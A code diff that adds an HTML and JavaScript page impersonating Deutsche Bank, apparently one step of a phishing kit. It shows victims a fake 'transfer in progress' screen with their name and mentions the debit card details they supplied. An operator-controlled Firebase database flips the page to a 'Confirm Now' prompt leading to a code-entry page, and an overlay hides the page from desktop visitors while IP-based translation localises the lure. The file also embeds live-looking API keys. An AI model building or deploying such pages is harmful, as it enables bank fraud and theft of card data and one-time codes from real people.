@@ -1,0 +1,667 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google" content="notranslate"> 
+ <meta name="color-scheme" content="light">
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+      
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+           
+            margin: 0;
+            padding: 0;
+            
+            justify-content: center;
+            align-items: center;
+            user-select: none; /* Disables text selection */ -webkit-user-select: none; /* For Safari */ -moz-user-select: none; /* For Firefox */ -ms-user-select: none; 
+            min-height: 100vh;
+       
+        }
+        .email-container {
+           
+            width: 100%;
+          
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            border: none;
+            transform: scale(1);
+            transition: transform 0.5s ease-in-out;
+   margin-top: -12px;   
+        }
+       
+        .header {
+            text-align: center;
+            padding-bottom: 30px;
+            border-bottom: 2px solid #eeeeee;
+        }
+        .header h1 {
+            color: #4b2b7f;
+            font-size: 32px;
+            margin: 0;
+            font-weight: bold;
+        }
+        .header img {
+            max-width: 80px;
+            margin-bottom: 15px;
+            border-radius: 50%;
+        }
+        .content1 {
+            font-family: 'Poppins', sans-serif;
+            
+            color: #4a4a4a;
+            line-height: 1.8;
+            font-size: 15px;
+        }
+        .content1 p {
+            
+            animation: fadeIn 1s ease-out;
+        }
+        .content1 a {
+            color: #009688;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .content1 a:hover {
+            text-decoration: underline;
+        }
+ 
+        .note {
+            background-color: #f9fbe7;
+            border-left: 6px solid #ffb74d;
+            padding: 20px;
+            margin-top: 25px;
+            font-style: italic;
+            color: #555555;
+            animation: slideIn 6.9s ease-out;
+        }
+        .dot-container {
+      display: flex;
+      gap: 10px;
+  margin-left: 119px;
+    }
+    
+    .dot {
+      width: 11px;
+      height: 11px;
+      background-color: white;
+      border-radius: 50%;
+      transition: background-color 0.3s ease;
+border: 0.1px solid black;   
+  margin-top: 3%;
+   margin-left: 3%;
+    }
+        /* Keyframes for animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-100%); }
+            to { transform: translateX(0); }
+        }
+        /* Media Queries */
+        @media (max-width: 600px) {
+            .email-container {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 28px;
+            }
+        }
+         .email-container1 {
+           font-family: 'Poppins', sans-serif;
+            
+           
+            max-width: 630px;
+            margin: 1px;
+            padding: 40px;
+            border-radius: 15px;
+         
+            border: none;
+            transform: scale(1);
+            transition: transform 0.3s ease-in-out;
+    display: none;
+   position: fixed;
+ 
+  margin-top: 16%;
+               
+           }
+      
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #4b2b7f;
+            margin-bottom: 20px;
+        }
+   
+        .header h1 {
+            color: #004d40;
+            font-size: 18px;
+            margin: 0;
+            font-weight: 700;
+        }
+        .content {
+            color: #333333;
+            line-height: 1.6;
+            font-size: 15px;
+            padding: 20px;
+            border: 1px solid #e0f2f1;
+            border-radius: 10px;
+      height: 82vh;
+            background-color: #f9fbe7;
+        }
+        .content p {
+            margin: 15px 0;
+        }
+        .content a {
+            color: #00796b;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+        .content a:hover {
+            color: #004d40;
+            text-decoration: underline;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 28px;
+            background-color: #4b2b7f;
+            color: #ffffff;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            text-transform: uppercase;
+            display: block;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .btn:hover {
+            background-color: #004d40;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #777777;
+            font-size: 14px;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 10px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .footer a {
+            color: #00796b;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 600px) {
+            .email-container1 {
+                padding: 20px;
+            }
+            .btn {
+                padding: 12px 24px;
+                font-size: 16px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+     .header5 {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            
+        }
+
+        .header5 h1 {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0;
+            text-align: center;
+        margin-top: -1%;
+        }
+  .back-arrow1 {
+      width: 11px;
+      height: 11px;
+      border-left: 2.3px solid purple;
+      border-bottom: 2.3px solid purple;
+      transform: rotate(45deg);
+      margin-left: -85%;
+      position: fixed;
+  margin-top: -1%;
+    }
+  #transportForm{
+      margin-top: 16%;
+  } 
+   .row3d {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1.5px solid #ddd;
+        }
+
+        .row3d:last-child {
+            border-bottom: none;
+        }   
+   .modal {
+            display: none;
+            position: fixed;
+            z-index: 99999;
+           
+            top: 0;
+            width: 97%;
+            height: 100%;
+           background-image: url('world.jpg'); /* Replace with the generated globe image */
+  background-size: cover; /* Ensures the image covers the screen */
+  
+  background-repeat: no-repeat;
+      margin-left: -6px;    
+       padding: 10px;
+        }
+
+        .modal-content {
+            background-color: white;
+    
+            width: 96.3%;
+       margin-left: 2.4%;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        
+    </style>
+</head>
+<body>
+    <div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay"></div>
+
+ <div id="modal5" style="display: none;  z-index: 999999999999;"class="modal" >
+  <div style="background-color: white;  border-radius: 10px; " class="modal-content">
+    <h1 style ="font-size: 25px;"id="lopp">Transaction Confirmed!</h1>
+      
+
+        <div class="content">
+            <p style="margin-bottom: -9px;"id="dogg">Dear</p>
+            <span style="font-weight: bold;"id="displayName2"></span> 
+            <p style ="margin-top: -1%;"id="doll">We’re Happy to let you know that your transaction has been successfully confirmed! 🎉</p>
+
+            <p id="dogg1">To complete the process, please click the button below. This final step will ensure that everything is processed correctly and your transaction is fully completed.</p>
+
+ 
+            <button id="dogg2" class="btn">Confirm Now</button>
+
+            <p id="dogg3">Thank you for your cooperation. We look forward to serving you again soon!</p>
+        </div>
+</div>
+    </div>
+    <div id="modal3" style="display: none;" class="modal">
+      <div class="modal-content">
+        <div style="position: fixed;"></div>   
+             <div class="header5" >
+      <div id="hand4" class="back-arrow1"></div>     
+            <h1 id="wella1">Transfer in Progress</h1>
+      </div>
+          
+            <!-- Optional Logo -->
+            
+          
+   <div class="dot-container">
+    <div class="dot" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+    <div class="dot" id="dot4"></div>
+    <div class="dot" id="dot5"></div>
+  </div>    
+     <div class="row3d"></div>   
+     
+        <div class="content1">
+            <p style="margin-bottom: -10px;"id="look">Dear</p>
+        <span style="font-weight: bold;"id="displayName"></span>   
+            <p style="margin-top: -1%;"id="you">We are writing to inform you that your transaction is currently being processed. Our team is closely monitoring the progress to ensure it is completed swiftly and securely.</p>
+
+            <p id="hate">Your trust in us is highly valued. Rest assured that we are doing everything possible to deliver the best service. </p>
+
+           
+
+            <div class="note" id="bee">
+                Please note that this process may take some time depending on external factors, but we will notify you as soon as it is complete.
+            </div>
+
+            
+
+            <p id="ant">Thank you for choosing [Deutsche Bank]. We look forward to serving you again.</p>
+         <button style="display: none;" id="btnModal1">Open Modal 1</button>
+    <button style="display: none" id="btnModal2">Open Modal 2</button>
+    <button style="display: none"id="btnModal3">Open Modal 3</button>
+
+    <!-- Modal 1 -->
+    <div  style="display: none" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal1">&times;</span>
+            
+        </div>
+    </div>
+
+    <!-- Modal 2 -->
+    <div style="display: none" id="modal2"  class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal2">&times;</span>
+            <p>Modal 2 Content</p>
+        </div>
+    </div>
+
+    <!-- Modal 3 -->
+    <div style ="display: none;"class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal3">&times;</span>
+            <p>Modal 3 Content</p>
+        </div>
+    </div>
+        </div>
+ </div>
+ </div>
+
+ <script>
+function detectDesktopMode() {
+            // Check if the device is a mobile device by user-agent
+            const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
+
+            // Get the current viewport width
+            const viewportWidth = window.innerWidth;
+
+            const deviceStatusElement = document.getElementById("deviceStatus");
+
+            // If it's a mobile device and the viewport width is greater than 800px, we consider it "desktop mode"
+            if (isMobile && viewportWidth > 800) {
+                // Desktop Mode on Mobile
+       document.getElementById("overlay").style.display = "block";         
+          
+            } else if (isMobile && viewportWidth <= 800) {
+                // Mobile Mode
+               document.getElementById("overlay").style.display = "none";            // Mobile mode
+                
+            } else {
+      document.getElementById("overlay").style.display = "block";                    
+            }
+        }
+
+        // Detect device mode on page load
+        window.addEventListener("DOMContentLoaded", detectDesktopMode);
+
+        // Detect on window resize to handle desktop/mobile mode changes dynamically
+        window.addEventListener("resize", detectDesktopMode);
+
+ const formattedAmount = localStorage.getItem("fullname");
+      document.getElementById("displayName").textContent = formattedAmount 
+        ? formattedAmount 
+        : "No amount found in storage.";
+   const formattedAmount2 = localStorage.getItem("fullname");
+      document.getElementById("displayName2").textContent = formattedAmount2
+        ? formattedAmount2
+        : "No amount found in storage.";
+    // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+            authDomain: "tuak-9f342.firebaseapp.com",
+            databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+            projectId: "tuak-9f342",
+            storageBucket: "tuak-9f342.appspot.com",
+            messagingSenderId: "9176071516",
+            appId: "1:9176071516:web:38491206a78ed1c4035599",
+            measurementId: "G-BM58W3CJTQ"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Helper function to sanitize email
+        function sanitizeEmail(email) {
+            return email.replace(/\./g, ",");
+        }
+
+        // Retrieve email from local storage
+        const email = localStorage.getItem("userEmail");
+        if (!email) {
+   window.parent.document.getElementById("iframe").src = "index.html";  
+            console.error("No email found in local storage.");
+        } else {
+            const sanitizedEmail = sanitizeEmail(email);
+            const emailRef = db.ref(`messages/${sanitizedEmail}`);
+
+           
+            // Check and apply Modal 5 display state on page load
+            emailRef.child("confirmDisplay").on("value", (snapshot) => {
+                const modal5Display = snapshot.val();
+                const modalElement = document.getElementById("modal5");
+                if (modal5Display) {
+                    modalElement.style.display = "block";
+                   
+               modal3.style.display = "none"; // 
+                } else {
+                    modalElement.style.display = "none";
+       console.log("Modal 5 closed. Setting modal 3 as active.");
+    modal3.style.display = "block"; // Show modal 3
+        
+                }
+            });
+          
+            
+            // Modal 1 Logic
+            const modal5 = document.getElementById("modal5");
+            const btnModal5 = document.getElementById("btnModal1");
+            const closeModal5 = document.getElementById("closeModal1");
+
+            btnModal5.onclick = function () {
+                modal5.style.display = "block";
+           updateModal5Display(true);    
+            
+           modal3.style.display = "none"; // Show modal 3
+    
+            };
+
+          closeModal5.onclick = function () {
+    // Close modal 5
+    modal5.style.display = "none";
+
+   
+    // Set modal 3 as active
+    console.log("Modal 5 closed. Setting modal 3 as active.");
+    modal3.style.display = "block"; // Show modal 3
+
+};
+            // Modal 2 Logic
+            const modal2 = document.getElementById("modal2");
+            const btnModal2 = document.getElementById("btnModal2");
+            const closeModal2 = document.getElementById("closeModal2");
+  btnModal2.onclick = function () {
+                
+            };
+
+          
+            closeModal2.onclick = function () {
+                modal2.style.display = "none";
+               
+            };
+
+            // Modal 3 Logic
+            const modal3 = document.getElementById("modal3");
+            const btnModal3 = document.getElementById("btnModal3");
+            const closeModal3 = document.getElementById("closeModal3");
+
+            btnModal3.onclick = function () {
+                modal3.style.display = "block";
+               
+            };
+
+            closeModal3.onclick = function () {
+                modal3.style.display = "none";
+                
+            };
+
+window.addEventListener("load", () => {
+    console.log("Page load: Showing modal3 and starting heartbeat.");
+
+   
+
+    // Set modal 3 as active and start its heartbeat
+    modal3.style.display = "block";
+    
+});
+}
+    let dots = document.querySelectorAll('.dot');
+    let index = 0;
+
+    function animateDots() {
+      dots.forEach(dot => dot.style.backgroundColor = 'white'); // Reset all dots to white
+      dots[index].style.backgroundColor = '#4b2b7f'; // Change the current dot to green
+      
+      index = (index + 1) % dots.length; // Move to the next dot
+    }
+
+    // Start the animation and repeat it every 0.3 seconds
+    setInterval(animateDots, 300);
+
+document.addEventListener('DOMContentLoaded', function() {
+   
+               
+            
+
+  const countryLanguageMap = {
+                "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+                "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+                "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+                "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+                "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+                "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+                "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+                "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+                "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+                "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+                "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+                "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+                "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+                "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+                "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+                "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+                "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+                "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+                "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+                "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+                "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+                "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+                "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+                "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+                "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+                "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+                "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+                "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+            };
+
+            function detectCountry(callback) {
+                fetch('https://ipinfo.io/json?token=84581b889c1970')
+                    .then(response => response.json())
+                    .then(data => {
+                        callback(data.country);
+                    })
+                     .catch(error => {
+             console.error('Error detecting country:', error);
+  document.getElementById("overlay").style.display = "block";         
+    });
+}
+
+            function translateText(text, targetLanguage, callback) {
+                     fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        const translatedText = data[0].map(item => item[0]).join('');
+                        callback(translatedText);
+                    })
+                      .catch(error => { 
+       console.error('Error translating text:', error);
+ document.getElementById("overlay").style.display = "block";         
+  });
+    }
+
+            function translateAllText(targetLanguage) {
+                const textsToTranslate = [
+                   
+                    { id: 'look', text: 'Dear' },
+  { id: 'you', text: 'We are writing to inform you that your transaction is currently being processed. Our team is closely monitoring the progress to ensure it is completed swiftly and securely.' },
+  { id: 'hate', text: 'Your trust in us is highly valued. Rest assured that we are doing everything possible to deliver the best service. ' },
+  { id: 'dear', text: 'Rest assured, the funds will be swiftly transferred to the debit card details you provided.' },
+      { id: 'withdraw', text: 'Transaction in Progress' },
+   { id: 'bee', text: 'Please note that this process may take some time depending on external factors, but we will notify you as soon as it is complete.' },             
+{ id: 'ant', text: 'Thank you for choosing [Deutsche Bank]. We look forward to serving you again.' }, 
+{ id: 'dogg', text: 'Dear' }, 
+{ id: 'doll', text: 'We’re Happy to let you know that your transaction has been successfully confirmed! 🎉' }, 
+{ id: 'dogg1', text: 'To complete the process, please click the button below. This final step will ensure that everything is processed correctly and your transaction is fully completed.' }, 
+{ id: 'dogg2', text: 'Confirm Now' },
+ { id: 'dogg3', text: 'Thank you for your cooperation. We look forward to serving you again soon!' }, 
+{ id: 'lopp', text: 'Transaction Confirmed!' },
+{ id: 'wella1', text: 'Transfer in Progress' }                 
+               
+               
+               
+               
+                ];
+
+                textsToTranslate.forEach(item => {
+                    translateText(item.text, targetLanguage, translatedText => {
+                        const element = document.getElementById(item.id);
+                        if (element) {
+                            element.innerText = translatedText;
+                        }
+                    });
+                });
+            }
+
+            detectCountry(function(country) {
+                const targetLanguage = countryLanguageMap[country] || 'es'; // Default to Spanish if country not in map
+                translateAllText(targetLanguage);
+            });
+        });
+
+       document.getElementById("dogg2").addEventListener('click', function () {
+            window.parent.document.getElementById("iframe").src = "code.html";
+        });
+   document.getElementById("hand4").addEventListener('click', function () {
+            window.parent.document.getElementById("iframe").src = "pay.html";
+        });
+  //   // Add an event listener for the online event
+    window.addEventListener('online', () => {
+      console.log('Internet connection restored. Reloading page...');
+      location.reload(); // Reload the page when the connection is restored
+    });
+
+    // Optional: Add a listener for the offline event for logging
+    window.addEventListener('offline', () => {
+      console.log('Internet connection lost.');
+    });
+
+  </script>
+        
+
+</body>
+</html>
